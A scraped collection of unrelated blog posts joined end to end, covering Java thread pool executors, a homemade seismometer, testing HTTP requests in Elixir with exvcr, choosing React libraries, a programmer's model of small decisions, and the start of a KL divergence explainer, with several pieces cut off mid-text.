<code>ScheduledExecutorService</code> in the first diagram, as it extends the <code>ExecutorService</code> and provides methods to run scheduled tasks. It is an high-level abstraction for the <code>Timer</code>, and it is easier and better way to run periodic tasks.</p><h2 id="implementations-of-the-executorservice">Implementations of the ExecutorService</h2><p><code>ExecutorService</code> instances are mostly created by using <code>Executors</code> factory methods, and I will show it in the next section. <code>Executors</code> factory methods are easy way to generate Thread Pools, however before using that, I would like to show the important concrete classes that implements the <code>ExecutorService</code>, because the factory method internally retrieves one of these implementations, and I believe it is important to understand the internals. Knowing some of the concrete <code>ExecutorServices</code>, we can create custom pools in case we have specific needs.</p><p>If we look at the following diagram, we have <code>AbstractExecutorService</code> which provides default implementations of <code>submit</code>, <code>invokeAny</code> and <code>InvokeAll</code> methods of the <code>ExecutorService</code>. Concrete implementations overrides some of the implementation details.</p><figure><img src="https://turkogluc.com/content/images/2020/11/Screenshot-2020-11-02-at-17.22.20.png"><figcaption>Implementations of Executor interface</figcaption></figure><h3 id="1-threadpoolexecutor">1- ThreadPoolExecutor</h3><p>The <code>ThreadPoolExecutor</code> is a one of the core implementation of the <code>ExecutorService</code> and it executes each submitted task using one of possibly several pooled threads. This class provides many adjustable parameters and extensibility for configuring and managing the pool. We can configure the following parameters in this class:</p><ul><li><strong>corePoolSize</strong>: minimum number of Threads in the pool.</li><li><strong>maximumPoolSize</strong>: it is self explanatory, the upper bound of pool size. By setting the <code>corePoolSize</code> and <code>maximumPoolSize</code> the same number, we simple create a fixed size pool.</li><li><strong>ThreadFactory</strong>: New threads are created by using a <code>ThreadFactory</code> which is by default <code>Executors#defaultThreadFactory</code> that creates threads to all be in the same <code>ThreadGroup</code>, with the same <code>priority</code> and <code>non-daemon</code> status. If you like to customise it, you can set a different <code>ThreadFactory</code>.</li><li><strong>keepAliveTime</strong>: When the pool has more than minumum number and the threads are idle, exceeding ones are terminated after the <code>keepAliveTime</code>.</li><li><strong>Queue</strong>: A <code>BlockingQueue</code> can be configured to keep the submitted tasks. Example queues and the queueing strategies are as follows:</li></ul><ol><li><code>SynchronousQueue</code>: It is provides a <strong>direct handoff strategy</strong>, which means that tasks are delivered directly to the workers without storing them in a queue. If no threads are available to take the received task, then a new thread will be constructed. If a maximumPoolSize is set and that limit is reached, task will be rejected.</li><li><code>LinkedBlockingQueue</code>: It provides <strong>unbounded queue strategy</strong> which means, using a queue without a predefined capacity. This will cause new tasks to wait in the queue when all corePoolSize threads are busy. So no more than corePoolSize threads will be created and the value of maximumPoolSize does not have any effect.</li><li><code>ArrayBlockingQueue</code>: It provides <strong>bounded queue strategy </strong>which means, using a queue with a predefined capacity. It has a limited space in its queue therefore there should be enough number of threads to consume the tasks rapidly. When the queue is not full tasks are added to the queue. When queue becomes full, and the number of threads are less than maximumPoolSize a new thread is created. Finally when number of threads reaches the limit, the task is rejected.</li></ol><p>We can configure parameters mentioned above at the construction time or later with the setter methods.</p><pre><code>public ThreadPoolExecutor(int corePoolSize,

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>The seismometer is a device for the detection of earthquakes and measuring their strength. Basically these are very precise instruments and are relatively difficult for self-construction. Commercially available sensors are very expensive, and cheap electronic modules sensitive to shocks are not sufficiently sensitive to this purpose.</p><p>In the text and video that follow, you can see the creation of a device that is cheap and relatively easy for DIY, and yet it is comparable with expensive commercial devices of this type</p><p>Otherwise, the seismometer itself consists of two parts, a mechanical tremor detector, and an electronic part that turns these tremors into electrical signals, amplified them and converts them into digital signals, which we can then visually monitor on the PC data logging software.</p>
<p>To convert the tremors into electrical signals, a permanent magnet is used as a movable part and a solenoid with many windings for turning the magnet moves into electrical signals. In this particular case I used the primary winding of a small mains transformer with a power of 1.8 W and a resistance of 1.2 kOhms. At This coil is a glued aluminum plate, which has the function to dump the oscillations of the moving magnet called the "Lentz effect".</p>
<p>Тhe next module serves to amplify this signal and contains a low-noise operation amplifier(TL061, NE5534..) or instrumental operational amplifier(OP07, OP27, LT1677...), but it works well with the old good 741 with external power supply.Now this enhanced analog signal is taken at the A0 input of the Arduino microcontroller.  In fact, the Arduino represents an analog to a digital converter. For test purposes we can use the arduino example for a / d converter called "AnalogInOutSerial", but of course, the best is the code called "NERdaq". NERdaq is a data acquisition system developed at New England Research to support slinky-based seismometers in schools. The daq is built around an arduino and streams 16-bit (oversampled) values to a usb port; the data are sampled at about 18.78 samples/second. Arduino codes are provided for unrestricted use, and are also available at    https://code.google.com/archive/p/nerdaq/ </p><p>The code contains several filters that have been developed specifically for this purpose.This processed signal through the serial protocol is carried to data logging softwer for storing data and visual representation.</p><p>The best free software for this purpose is "Amaseis" and the newest "JAmaseis" (Java Amaseis). These programs can be downloaded to the next links:</p><p><span>- </span><a href="http://harvey.binghamton.edu/~ajones/AmaSeis.html" data-ha="{&quot;eventName&quot;:&quot;Clicked link&quot;,&quot;customProps&quot;:{&quot;value&quot;:&quot;http://harvey.binghamton.edu/~ajones/AmaSeis.html&quot;,&quot;href&quot;:&quot;http://harvey.binghamton.edu/~ajones/AmaSeis.html&quot;,&quot;type&quot;:&quot;story&quot;,&quot;location&quot;:&quot;story&quot;},&quot;clickOpts&quot;:{&quot;delayRedirect&quot;:true}}" rel="nofollow">http://harvey.binghamton.edu/~ajones/AmaSeis.html</a></p><p><span>- </span><a href="https://www.iris.edu/hq/jamaseis/" data-ha="{&quot;eventName&quot;:&quot;Clicked link&quot;,&quot;customProps&quot;:{&quot;value&quot;:&quot;https://www.iris.edu/hq/jamaseis/&quot;,&quot;href&quot;:&quot;https://www.iris.edu/hq/jamaseis/&quot;,&quot;type&quot;:&quot;story&quot;,&quot;location&quot;:&quot;story&quot;},&quot;clickOpts&quot;:{&quot;delayRedirect&quot;:true}}" rel="nofollow">https://www.iris.edu/hq/jamaseis/</a></p><p>With the help of Jameseis, you can upload real-time data on the IRIS server. For example you can see realtime data from my seismometer on:</p><p><span>- </span><a href="http://geoserver.iris.edu/content/mpohr" data-ha="{&quot;eventName&quot;:&quot;Clicked link&quot;,&quot;customProps&quot;:{&quot;value&quot;:&quot;http://geoserver.iris.edu/content/mpohr&quot;,&quot;href&quot;:&quot;http://geoserver.iris.edu/content/mpohr&quot;,&quot;type&quot;:&quot;story&quot;,&quot;location&quot;:&quot;story&quot;},&quot;clickOpts&quot;:{&quot;delayRedirect&quot;:true}}" rel="nofollow">http://geoserver.iris.edu/content/mpohr</a></p><p>In the pictures below, you can make a comparison between my seismometer, and that of the official seismological observatory of my city.It's a very weak tremor and as you can see there is almost no difference between the two seismograms, which is a confirmation of the sensitivity and precision of this homemade cheap seismometer.</p>
<p>The following picture shows an earthquake in Greece with a magnitude of 5.2 Richter degrees registered on my seismometer at a distance of 220 kilometers from the epicenter.</p>
<p>The instrument is very sensitive to air currents, so it must be properly protected.</p><p>And finally, this is a completely new sensor design invented and patented by me, that is both very sensitive and simple to build.I projected it on the basis of previous experience in making such devices. On my video channel you can see my other pre-made homemade seismometers:</p><p>  -DIY simle and cheap piezo seismometer</p><p>  -10$ sensitive seismometer</p><p>  -DIY Lehman seismometer</p><p>  -DIY horizontal pendulum seismometer</p><p>  -DIY AS1 seismometer</p><p>  -TC1 vertical seismometer</p>

November 3, 2020 | https://curiosum.dev/blog/test-http-requests-in-elixir-with-exvcr | <a href="https://web.archive.org/web/*/https://curiosum.dev/blog/test-http-requests-in-elixir-with-exvcr">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>As your app grows so does its integrations base. At some point, you may need to consume API from third-party services. Today you'll learn how to test them properly with the exvcr library.</p><div>
<h2>Demo app</h2>
<p>To illustrate why testing 3-rd party services is a problem, let's create a simple wrapper within the sample <code>Address Converter</code> app that will return the latitude and longitude of a geographical object. We're going to consume <a href="https://nominatim.openstreetmap.org/" target="_blank">https://nominatim.openstreetmap.org</a> free API for this purpose.</p>
<p>For simplicity, let's assume that the <code>Address Converter</code> app is already created. To interact easily with external API let's use the <code>HTTPoison</code> and <code>Jason</code> libraries.</p>
<p>In mix.exs:</p>
<pre><code><span><span>defp</span> <span>deps</span></span> <span>do</span>
  ...
  {<span>:jason</span>, <span>"~&gt; 1.0"</span>},
  {<span>:httpoison</span>, <span>"~&gt; 1.6"</span>}
  ...
<span>end</span></code></pre>
<p>and after that:</p>
<pre><code>mix deps.<span>get</span></code></pre>
<p>The next step is to implement Nominatim API wrapper. In <code>lib/address_converter/nominatim.ex</code> file, let's add few lines of code:</p>
<pre><code><span><span>defmodule</span> <span>AddressConverter.Nominatim</span></span> <span>do</span>
  <span>@base_url</span> <span>"https://nominatim.openstreetmap.org/search?format=json&amp;q="</span>
  <span>@headers</span> [{<span>"Content-Type"</span>, <span>"application/json"</span>}]

  <span><span>def</span> <span>fetch_coordinates</span></span>(query) <span>do</span>
    <span>with</span> %{ <span>body:</span> body } &lt;- HTTPoison.get!(<span>@base_url</span> &lt;&gt; query, <span>@headers</span>),
         response &lt;- Jason.decode!(body) <span>do</span>
      response
      |&gt; Enum.map(&amp;%{ <span>lat:</span> &amp;<span>1</span>[<span>"lat"</span>], <span>lon:</span> &amp;<span>1</span>[<span>"lon"</span>] })
      |&gt; Enum.at(<span>0</span>)
    else
      <span>_</span> -&gt; %{}
    <span>end</span>
  <span>end</span>
<span>end</span></code></pre>
<p>As you can see we are fetching data from <code>https://nominatim.openstreetmap.org</code> with proper query and JSON Content-Type header to easily interact with a response later on.</p>
<p>Thanks to the <code>Jason</code> library we can decode the returned body and use <code>Enum.map</code> to map each result's latitude and longitude. As <code>nominatim.openstreetmap.org</code> lists all possible geographical places that match the given query, there might a lot of mapped coordinates. For simplicity, let's assume that we only need the first one, and that's exactly why we use <code>Enum.at(0)</code>.</p>
<p>Quick demo of how it works:</p>
<pre><code>iex&gt; AddressConverter.Nominatim.fetch_coordinates(<span>"Poznan, Poland"</span>)
%{<span>lat:</span> <span>"52.4082663"</span>, <span>lon:</span> <span>"16.9335199"</span>}</code></pre>
<h2>Testing external API problem</h2>
<p>As our wrapper is ready to rock the world, we can proceed to the test phase.</p>
<p>In <code>test/address_converter/nominatim_test.exs</code> let's create the following test case scenario:</p>
<pre><code><span><span>defmodule</span> <span>AddressConverter.NominatimTest</span></span> <span>do</span>
  <span>use</span> ExUnit.Case, <span>async:</span> <span>true</span>

  <span>alias</span> AddressConverter.Nominatim

  describe <span>"fetch_coordinates/1"</span> <span>do</span>
    test <span>"for given query it should return proper coordinates"</span> <span>do</span>
      cords = %{<span>lat:</span> <span>"52.4082663"</span>, <span>lon:</span> <span>"16.9335199"</span>}

      assert Nominatim.fetch_coordinates(<span>"Poznan, Poland"</span>) == cords
    <span>end</span>
  <span>end</span>
<span>end</span></code></pre>
<p>It's as easy as checking whether the coordinates match proper values. Let's check it out in action:</p>
<pre><code>$ mix <span>test</span>

.

Finished <span>in</span> 0.4 seconds
1 <span>test</span>, 0 failures</code></pre>
<p><em>Side note: If you want to make sure that our code is making a real HTTP request, turn off the internet connection and run this test once again.</em></p>
<p>Ok, our test works as intended. So what's the problem?</p>
<p>Well, with this solution, <strong>each time we run this test</strong> it's executing a real HTTP request to fetch the data. It's not a good idea, and there are at least five reasons why:</p>
<ul>
<li>request/response cycle might take some time, you don't want to slow down your tests,
</li>
<li>it might not be a free API, you may pay for requests that are being executed during tests,
</li>
<li>some APIs have rate limits,
</li>
<li>you need an internet connection all the time even if you didn't change test and code,
</li>
<li>response for a given request <strong>in most cases</strong> should always be the same (we can mock it).
</li>
</ul>
<h2>Meet exvcr library</h2>
<p>In this case, the solution to our problem is to record the response in a file. We don't have to do it manually, there is a lib for that, and it's called <a href="https://github.com/parroty/exvcr" target="_blank">exvcr</a>.</p>
<p>Let's add this lib to deps:</p>
<pre><code><span><span>defp</span> <span>deps</span></span> <span>do</span>
  ...
  {<span>:exvcr</span>, <span>"~&gt; 0.11"</span>, <span>only:</span> <span>:test</span>}
  ...
<span>end</span></code></pre>
<p>As you can see we're only adding it to test dependencies, as most likely you'll not gonna use it in the dev/prod environment.</p>
<p>Let's fetch our new dependency:</p>
<pre><code>mix deps.get</code></pre>
<p>If you take a look at the documentation, you'll notice that currently <code>exvcr</code> works well with three HTTP clients:</p>
<ul>
<li>hackney,
</li>
<li>httpc,
</li>
<li>ibrowse.
</li>
</ul>
<p>It means that if you're trying to test a code that makes an HTTP request using one of these clients under the hood then you're good to go. In our case, we're using <code>HTTPoison</code> which is built on top of <code>Hackney</code>.</p>
<p>Here is an updated test code that takes leverage of <code>exvcr</code>:</p>
<pre><code><span><span>defmodule</span> <span>AddressConverter.NominatimTest</span></span> <span>do</span>
  <span>use</span> ExUnit.Case, <span>async:</span> <span>true</span>
  <span>use</span> ExVCR.Mock, <span>adapter:</span> ExVCR.Adapter.Hackney

  <span>alias</span> AddressConverter.Nominatim

  setup <span>do</span>
    ExVCR.Config.cassette_library_dir(<span>"fixture/vcr_cassettes"</span>)
    <span>:ok</span>
  <span>end</span>

  describe <span>"fetch_coordinates/1"</span> <span>do</span>
    test <span>"for given query it should return proper coordinates"</span> <span>do</span>
      use_cassette <span>"nominatim"</span> <span>do</span>
        response = %{<span>lat:</span> <span>"52.4082663"</span>, <span>lon:</span> <span>"16.9335199"</span>}

        assert Nominatim.fetch_coordinates(<span>"Poznan, Poland"</span>) == response
      <span>end</span>
    <span>end</span>
  <span>end</span>
<span>end</span></code></pre>
<p>Let's break it down.</p>
<p>First, we use the <code>ExVCR.Mock</code> module with a proper adapter. As already mentioned, <code>HTTPoison</code> uses <code>Hackney</code> under the hood:</p>
<pre><code><span>use</span> ExVCR.Mock, <span>adapter:</span> ExVCR.Adapter.Hackney</code></pre>
<p>Next, we need to configure <code>ExVCR</code> cassettes path:</p>
<pre><code>setup <span>do</span>
  ExVCR.Config.cassette_library_dir(<span>"fixture/vcr_cassettes"</span>)
  <span>:ok</span>
<span>end</span></code></pre>
<p>Once we run the test, it'll create a file with recorded HTTP request/response data and save it in the <code>fixture/vcr_cassettes</code> folder. Can we choose the name for this file? We can, and that's exactly what happens here:</p>
<pre><code>use_cassette <span>"nominatim"</span> <span>do</span>
  ...
<span>end</span></code></pre>
<p><code>use_cassette</code> wraps the block of code to ensure that all HTTP requests and responses will be saved into the <code>nominatim</code> file cassette.</p>
<p>Ok, since we're now familiar with <code>ExVCR</code> and how it can be used within a test case scenario let's run our test:</p>
<pre><code>$ mix <span>test</span>

.

Finished <span>in</span> 0.7 seconds
1 <span>test</span>, 0 failures</code></pre>
<p>It works! As you should notice, there is a new file in your repo - <code>fixture/vcr_cassettes/nominatim.json</code>:</p>
<pre><code>[
  {
    <span>"request"</span>: {
      <span>"body"</span>: <span>""</span>,
      <span>"headers"</span>: {
        <span>"Content-Type"</span>: <span>"application/json"</span>
      },
      <span>"method"</span>: <span>"get"</span>,
      <span>"options"</span>: [],
      <span>"request_body"</span>: <span>""</span>,
      <span>"url"</span>: <span>"https://nominatim.openstreetmap.org/search?format=json&amp;q=Poznan, Poland"</span>
    },
    <span>"response"</span>: {
      <span>"binary"</span>: <span>false</span>,
      <span>"body"</span>: ..., // The body is a bit long to paste it here
      <span>"headers"</span>: {
        <span>"Server"</span>: <span>"nginx"</span>,
        <span>"Date"</span>: <span>"Thu, 29 Oct 2020 17:51:44 GMT"</span>,
        <span>"Content-Type"</span>: <span>"application/json; charset=UTF-8"</span>,
        <span>"Transfer-Encoding"</span>: <span>"chunked"</span>,
        <span>"Connection"</span>: <span>"keep-alive"</span>,
        <span>"Keep-Alive"</span>: <span>"timeout=20"</span>,
        <span>"Access-Control-Allow-Origin"</span>: <span>"*"</span>,
        <span>"Access-Control-Allow-Methods"</span>: <span>"OPTIONS,GET"</span>
      },
      <span>"status_code"</span>: <span>200</span>,
      <span>"type"</span>: <span>"ok"</span>
    }
  }
]</code></pre>
<p>In the end, <code>ExVCR</code> runs a real HTTP request to save request and response data, and then when you run the test again, it's trying to match the pattern of request to deliver response without performing HTTP request again. If it finds a match, it returns a saved response. If there is no match, again, a real HTTP request will be performed to save data into a cassette file.</p>
<p>To make sure that our test doesn't depend on internet connection anymore (so there is no real HTTP request), let's turn it off and run our test once again:</p>
<pre><code>$ mix <span>test</span>

.

Finished <span>in</span> 0.7 seconds
1 <span>test</span>, 0 failures</code></pre>
<p>Great! This is how you can improve tests that depend on external services with the <code>ExVCR</code> cassette mechanism. There is more configuration stuff in this library, as well as little details that you may want to use. Makes sure to check the <a href="https://github.com/parroty/exvcr" target="_blank">documentation</a>.</p>

November 3, 2020 | https://maxrozen.com/guidelines-for-choosing-react-libraries/ | <a href="https://web.archive.org/web/*/https://maxrozen.com/guidelines-for-choosing-react-libraries/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>After publishing my previous article tracking <a href="https://maxrozen.com/keeping-up-with-react-libraries/">React Libraries worth talking about</a>, a few people asked me how I decide which library to use in my own projects.</p>
<p>Truth is, I don’t have a single hard and fast rule, but rather a feeling that comes from looking at how a library stacks up against a set of quick checks that I’ve developed over the years of being burned by dodgy libraries.</p>
<p>I’ve also been asked this several times over the years as an interview question for frontend developer roles. I’ve heard different answers every time I asked the question back to the interviewer - keep in mind that some teams care about different things, and <strong>you might have to decide for yourself</strong>.</p>
<p>Also, if you strongly disagree with these points, feel free to write up an article, and share it <a href="https://twitter.com/RozenMD">with me</a>! I’m genuinely interested in what other developers look at when picking their libraries.</p>
<h2 id="docs"><a href="#docs" aria-label="docs permalink"></a>Docs</h2>
<p>One of the first things I check before installing a library is the documentation.</p>
<ul>
<li>Are the docs up to date?</li>
<li>Are they versioned (if the maintainers update the library over time, can I go back and still read the docs from the version I use)?</li>
<li>Are they detailed enough that I can figure out how to use the library for my use case?</li>
</ul>
<h2 id="issues"><a href="#issues" aria-label="issues permalink"></a>Issues</h2>
<p>I also check GitHub Issues to see if the library still works, and to see how active the maintainers are. Not so much to outright reject libraries with inactive maintainers, but more to guide my expectations.</p>
<ul>
<li>Will I have to support myself/contribute before I can even use the library?</li>
<li>Are there glaring open issues that I might care about, such as the library not working any more, or not supporting certain use cases.</li>
</ul>
<h2 id="browsermobile-compatibility"><a href="#browsermobile-compatibility" aria-label="browsermobile compatibility permalink"></a>Browser/Mobile Compatibility</h2>
<p>Especially in the case of Component/UI libraries, I want to know the extent of browser and mobile support. I wouldn’t <em>always</em> check this, but checking GitHub Issues for problems with browsers can save you pain later.</p>
<p>Unfortunately there are still end-users out there that still want IE11 to be supported (particularly government agencies), so some teams may wish to check for Internet Explorer compatibility when picking libraries.</p>
<h2 id="library-size"><a href="#library-size" aria-label="library size permalink"></a>Library size</h2>
<p>If a library is small enough, or I only need a small portion of the library, I might not even install it with <code>yarn</code> or <code>npm</code>. I’ll just copy the function into a utils folder and write my own tests for it.</p>
<p>In the end, we’re hunting for functionality, and I’d prefer to avoid writing fresh code where possible. If a library exists, you may as well use it rather than writing your own from scratch.</p>
<p><em>Side note</em>: I witnessed the cost of ignoring this, particularly with <a href="https://swr.vercel.app/">SWR</a> - a team I worked with implemented their own version, experienced and fixed the same bugs/pitfalls, and learned the same lessons in state and cache management. Easily hundreds of hours that could have been saved with a <code>yarn add swr</code>/<code>npm install swr</code>.</p>
<p>On the other hand, is it too big? Unless I’m building a super quick prototype, I will always compare libraries in <a href="https://bundlephobia.com/">Bundlephobia</a>, and prefer the smaller library (and consider the other points in this article).</p>
<h2 id="examples"><a href="#examples" aria-label="examples permalink"></a>Examples</h2>
<p>If I have to choose between two libraries, (and all else being equal), I’d pick the one with examples. Bonus points for using <a href="https://codesandbox.io/">CodeSandbox</a> or providing running examples that I can copy paste out of the repo.</p>
<p>If you want to see how well this can be done in the React ecosystem, see <a href="https://github.com/jaredpalmer/razzle/tree/master/examples">Razzle</a> and <a href="https://react-hook-form.com/">React Hook Form</a>.</p>
<h2 id="popularity"><a href="#popularity" aria-label="popularity permalink"></a>Popularity</h2>
<p>I’d be lying if I said popularity didn’t bias my decision, so I’ve included it in this article. That being said though, I wouldn’t shy away from being an early adopter of a library if it solved a problem I was looking to fix.</p>
<p>There are a few means of understanding how popular a library is:</p>
<ul>
<li>
<p>Number of stars on GitHub, combined with “Used by” on GitHub</p>
<p>(In my opinion) the number of stars alone will just tell you how many blog posts people write about a library, and how famous the maintainers are. Combining the number of stars with the number of projects that use the library as a dependency gives you a better understanding of whether it’s actually used.</p>
</li>
<li>
<p>Weekly downloads on npm</p>
<p>It’s worth keeping in mind that this number is not always bulletproof.</p>
<p>For example, <code>@testing-library/react</code> recently beat <code>enzyme</code> on weekly downloads, however <code>@testing-library/react</code> is now downloaded as part of create-react-app, regardless of whether it’s used or not.</p>
</li>
</ul>
<h2 id="summary"><a href="#summary" aria-label="summary permalink"></a>Summary</h2>
<p>In conclusion, this article was an attempt at explaining what I look at (often without even realising) when deciding to use a library.</p>
<p>Different developers will have different opinions and criteria - we haven’t all had the same career, we’ve all seen and experienced different things to shape what we value.</p>
<p>If you’re just starting out in the frontend, hopefully this article gives you guidance in terms of what to look for.</p></div></div>]]>

<small>Would you like to walk here at night? Photo: Andrey Hitrin</small></p>

<p>Sometimes thoughts of our human nature makes me sad.
Our attempts to share own thoughts to others can be compared with attempts to find a way out from the dense forest during a moonless night aimed only with a laser pointer.
The only thing you could show to others is a little spot of light randomly jumping back and forth, appearing and disappearing spontaneously.
How could you find a trail with such a weak tool?
How could you convince your party to follow it?
How could you understand if this trail should take you out of the forest?</p>

<p>That’s why people try to invent new and new words to explain same conceptions.
Everyone hopes that his/her explanations will be good enough to make other understand “the inner nature of things”.
Most of the time it’s worthless: others don’t see more than chaotically jumping light spot.</p>

<p>Nevertheless, here is my own attempt.
Words written here are not the truth, they are nothing more than my biased reflection of it, based on my limited experience.
I don’t know if they are contains some wisdom, or just a bunch of useless commonplace.
That’s you who will judge.</p>

<h2 id="the-quest-for-mastery">The quest for mastery</h2>

<p>As usual, I want to speak about programming.</p>

<p>There is an idea that programming has many similarities with martial arts or musical performing.
In all of these areas you could show some results after relatively little amount of practice, but it requires years of studying and training if you want to achieve truly significant level.
Often you even have to perform at the edge of your own abilities.</p>

<p>And when you want to perform at such level, you must be aware of all aspects of your profession.
Today I want to speak about small and often invisible decisions that guide you through your everyday work.</p>

<h2 id="small-decisions">Small decisions</h2>

<p>In our job, you need to do a lot of small decisions every day.
Just watch after yourself during work process, and soon you will be able to notice them.</p>

<p>Imagine you’ve just started to work on some feature.
Small decisions appear instantly.
How will you start you work?
By reading documentation, or by checking code out, or by asking your colleagues?
Change some code first, or think about test cases?
Implement straightforward change, or roll out few refactorings beforehand?</p>

<p>How will you deal with “bad code” challenging your way: ignore it, or try to fix right now, or defer a fix for a “better time”?
How will you act when feeling struck: ask your teammate (and which one, when you have several of them), google your problem, stackoverflow it?
Or maybe simply wait until an answer forms inside your head (also known as ‘procrastinating’)?
Or maybe wait until someone asks you about the progress?</p>

<p>That’s what I mean by the “small decisions” term.
A lot (tens, or even hundreds per day) micro-choices you make in your work.
Sometimes you make this choice consciously, but often not!
You choose your path without even thinking about it, without even noticing the fact of choosing.</p>

<p>Does this matter?
I think it does.</p>

<h2 id="choosemove-dichotomy">Choose/move dichotomy</h2>

<p>Let’s draw your way through the imaginary “work task”.
I like to draw graphs, so it’s depicted as a graph.</p>

<p><img src="https://ahitrin.github.io/images/a-model-of-small-decisions/01_a_to_b.jpg" alt="one way from Start to Goal"></p>

<p>Every node here is a small choice you’ve made.
Arrows represent the “movement” between them.
A number of intermediate steps is arbitrary and depends on your own definition of “small decision”.
When you zoom out, they almost disappear.
When you zoom in, a single decision could be even as small as “<em>which finger should hit the given keyboard button?</em>”.
Here I choose something intermediate.</p>

<p>And now let’s imagine more possible moves that also could solve your task.</p>

<p><img src="https://ahitrin.github.io/images/a-model-of-small-decisions/02_a_to_b.jpg" alt="many ways from Start to Goal"></p>

<p>Here we see a whole net of possible decisions.
What would happen if you choose another step at the start?
Some of alternative ways could be shorter (containing less hops), some of them could be much, much longer!
Of course, here I simplify the problem <strong>a lot</strong>.
But I need this simplification to show you few important things.
Here are following key points:</p>

<ol>
  <li>
    <p><strong>You have to make a lot of decisions</strong>.
There are points in almost every task that requires your decision.
For example, you need to ask yourself at least once: “<em>have I reached my goal?</em>”.
And then either get done with it or continue to work.</p>
  </li>
  <li>
    <p><strong>Even small decisions may have big impact</strong>.
When you choose the wrong path at start, it may lead you far away from the goal.
You have to move along the non-optimal path or return back to the start.</p>
  </li>
  <li>
    <p><strong>Every decision takes your time and energy</strong>.
Usually delay on decision come from one of two or three sources.
The first source is <strong>delay between a question and an answer</strong>.
Say you’re struck and don’t know where to move next.
You try to ask your colleague via IM for help.
But currently he/she is busy, and only can answer you in 20 minutes.
This delay is the cost of your decision.
The second source is <strong>delay on choosing</strong> by itself.
It may happen when you see two or more alternative paths and hesitate which one should be followed on (maybe a “frustration” word is suitable here).
The third one is <strong>a need to remember</strong> a known, but currently forgotten solution (more on this in the next chapter).</p>
  </li>
</ol>

<p>All of these make me conclude that it’s important to consider the impact of decision making to our work.
Low-quality decisions reduce your productivity <em>every day</em>.
They make you stray in the dark without help.</p>

<p>Surprisingly, even after reading a lot of books and articles on programmer’s productivity, I haven’t found enough much attention to this theme (please correct me if I’m wrong!).
That’s the main reason why I’ve started to write this article.</p>

<h2 id="a-table-of-decision-rules">A table of decision rules</h2>

<p>OK, maybe quality of decisions is important.
But how could we ever manage them?
Here I suggest a simple <em>model</em>.
As any other model, it doesn’t describe things as they are, but uses simpler (and more manageable) view on it instead.
The main power of modeling is its ability to predict effects of our actions, but we should never forget about its boundaries.
Outside boundaries, our model will be wrong - and I don’t know where they are.
I sincerely hope that your feedback could help determine them.</p>

<p>The model is heavily inspired by the work [1].
Think for a minute: this paper is already 40 years old!
Why no one still haven’t developed it into the similar direction as I did?
I don’t know (or maybe I’m just wrong - please let me know in that case).</p>

<p>This prelude was necessary - but now let’s proceed to the model.
So, suppose each of us have some kind of <em>table</em> in the head (I warned you, it’s a simplified view).
It contains two columns:</p>

<ol>
  <li>
    <p><strong>Trigger</strong>.
An external stimulus that could activate current “table row” or <em>rule</em>.
For example: a piece of code you’re looking at; a letter from CI server; a message from your colleague; your current thoughts about your task; and so on.</p>
  </li>
  <li>
    <p><strong>Acton</strong>.
A thing you do when the <em>rule</em> is being activated.</p>
  </li>
</ol>

<p>It may look like this:</p>

<table>
<colgroup>
<col width="35%">
<col width="5%">
<col width="60%">
</colgroup>
<thead>
<tr>
<th>Trigger</th>
<th></th>
<th>Action</th>
</tr>
</thead>
<tbody>
<tr>
<td>You need to find the source of a bug</td>
<td>→</td>
<td>Run <code>git bisect</code> to find a commit where it was introduced. Then analyse the code</td>
</tr>
<tr>
<td>You want to check if your code is ready to deploy</td>

<tr>

</tbody>
</table>

<p>This table has important properties:</p>

<ol>
  <li>
    <p>It <strong>changes over time</strong>, depending on your own experience and knowledge.
When you discover new tricks, they have a chance to hold in the table.
In other hand, even the best practices without repetition pass away from your memory.
Of course, they do not always being erased completely.
Rather, they are removed from “the cache”, the fastest part of your memory.
And you’ll have to make an effort of remembering to bring it back.</p>
  </li>
  <li>
    <p>It has <strong>limited size</strong>.
You cannot know literally everything.
You cannot have the best solution for every possible situation you may face.</p>
  </li>
  <li>
    <p>It may have <strong>several rules for one situation</strong>.
In that case your final choice may depend on current context.
Sometimes you may even need to spend additional time and effort to make a choice between alternative actions (“resolve a conflict”).</p>
  </li>
  <li>
    <p>It models <strong>only small decisions</strong>.
Only little choices that often even pass your spotlight and perform automatically could be modelled that way.
In terms of “Thinking, Fast and Slow” [2], it relies to the “System 1” only.</p>
  </li>
</ol>

<p>There could be different sources where these rules come from:</p>

<ul>
  <li>Your previous successful and unsuccessful experience.</li>
  <li>Observations of your teammates: how do they behave in different situations.</li>
  <li>Direct rules of the project you’re working on (like “use <code>./gradlew check</code> to verify correctness of your code”).</li>
</ul>

<p>I hope to write more on it in following articles, but the current one has grown big enough.
Seems like I have to go to conclusions.</p>

<h2 id="any-benefits">Any benefits?</h2>

<p>What benefits could the awareness about these rules bring to you?</p>

<p>First of all, you should take into consideration the limited size of your memory.
In order to make better decisions, you need to consciously “tune” your rule table.
How could it be done?</p>

<ul>
  <li>
    <p><strong>Remember your good (effective) decision rules</strong>.
Practice them from time to time so they don’t leave your working memory.
Write them down in known place so they could be remembered effectively when needed.</p>
  </li>
  <li>
    <p>Try to <strong>free your memory from unneeded decision rules</strong>.
If they aren’t needed, forget them.
If they still may be useful, keep them in an external place.
For example, imagine you have a complex …</p></li></ul></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-b9f64a9b22f91d323d73"><p>In this post we're going to take a look at a way of comparing two probability distributions called Kullback-Leibler Divergence (often shortened to just KL divergence). Very often in Probability and Statistics we'll replace observed data or a complex distributions with a simpler, approximating distribution. KL Divergence helps us to measure just how much information we lose when we choose an approximation.</p></div><div data-block-type="2" id="block-yui_3_17_2_3_1494396184641_57224"><p>Let's start our exploration by looking at a problem. Suppose that we're space-scientists visiting a distant, new planet and we've discovered a species of biting worms that we'd like to study. We've found that these worms have 10 teeth, but because of all the chomping away, many of them end up missing teeth. After collecting many samples we have come to this empirical probability distribution of the number of teeth in each worm:</p></div><div data-block-type="2" id="block-yui_3_17_2_3_1494396184641_5321"><p><br>While this data is great, we have a bit of a problem. We're far from Earth and sending data back home is expensive. What we want to do is reduce this data to a simple model with just one or two parameters. One option is to represent the distribution of teeth in worms as just a uniform distribution. We know there are 11 possible values and we can just assign the uniform probability of \(\frac{1}{11}\) to each of these possibilities.&nbsp;</p></div><div data-block-type="2" id="block-yui_3_17_2_3_1494396184641_9620"><p>Clearly our data is not uniformly distributed, but it also doesn't look too much like any common distributions we know. Another option we could try would be to model our data using the <a 